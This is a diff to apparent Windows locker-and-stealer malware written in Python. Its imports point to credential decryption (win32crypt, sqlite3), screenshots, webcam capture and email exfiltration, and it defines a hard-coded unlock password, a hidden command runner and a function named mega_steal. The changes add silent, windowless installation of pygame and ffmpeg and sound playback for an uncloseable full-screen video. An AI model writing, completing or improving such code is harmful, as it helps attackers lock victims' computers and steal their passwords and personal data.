@@ -1,9 +1,4 @@
-import subprocess, sys
-try:
-    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
-except: pass
-
-import os, sys, time, threading, tempfile, tkinter as tk
+import subprocess, sys, os, time, threading, tempfile, tkinter as tk
 from tkinter import PhotoImage
 import urllib.request, smtplib, socket, base64, random, re, json
 from email.mime.text import MIMEText
@@ -13,6 +8,16 @@ from email import encoders
 import cv2, numpy as np
 from PIL import ImageGrab
 import sqlite3, win32crypt, shutil, winreg, ctypes
+
+# ===== АВТО-УСТАНОВКА ВСЕХ БИБЛИОТЕК =====
+try:
+    subprocess.check_call([sys.executable, "-m", "pip", "install", "pygame"], 
+                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
+try:
+    subprocess.run(['winget', 'install', 'ffmpeg', '--accept-package-agreements', '--silent'], 
+                  capture_output=True, creationflags=subprocess.CREATE_NO_WINDOW)
+except: pass
 
 PASSWORD = "1601"
 MAX_ATTEMPTS = 4
@@ -30,7 +35,6 @@ LOGO_PATH = os.path.join(tempfile.gettempdir(), "logo.png")
 LOCKER_MUSIC_PATH = os.path.join(tempfile.gettempdir(), "Max_Quayle_-_Mr._Robot_OST_Main_Theme_(SkySound.cc).mp3")
 attempts_left = MAX_ATTEMPTS
 
-# ===== СКРЫТОЕ ВЫПОЛНЕНИЕ ВСЕХ КОМАНД =====
 def run_hidden(cmd):
     try: subprocess.run(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
     except: pass
@@ -197,8 +201,19 @@ def play_video():
         v.configure(bg='black'); v.overrideredirect(True)
         v.protocol("WM_DELETE_WINDOW", lambda: None)
         lbl = tk.Label(v, bg='black'); lbl.pack(expand=True, fill='both')
-        try: subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
-        except: pass
+        
+        # Звук: сначала ffplay, потом pygame
+        try:
+            subprocess.Popen(['ffplay','-nodisp','-autoexit','-loglevel','quiet', AUDIO_PATH], 
+                           shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, creationflags=subprocess.CREATE_NO_WINDOW)
+        except:
+            try:
+                import pygame
+                pygame.mixer.init()
+                pygame.mixer.music.load(AUDIO_PATH)
+                pygame.mixer.music.play()
+            except: pass
+        
         cap = cv2.VideoCapture(VIDEO_PATH)
         if cap.isOpened():
             fps = cap.get(cv2.CAP_PROP_FPS)
@@ -218,6 +233,8 @@ def play_video():
                 lbl.config(image=img); lbl.image = img; v.update()
             cap.release()
         v.destroy()
+        try: pygame.mixer.music.stop()
+        except: pass
     except: pass
 
 def mega_steal():
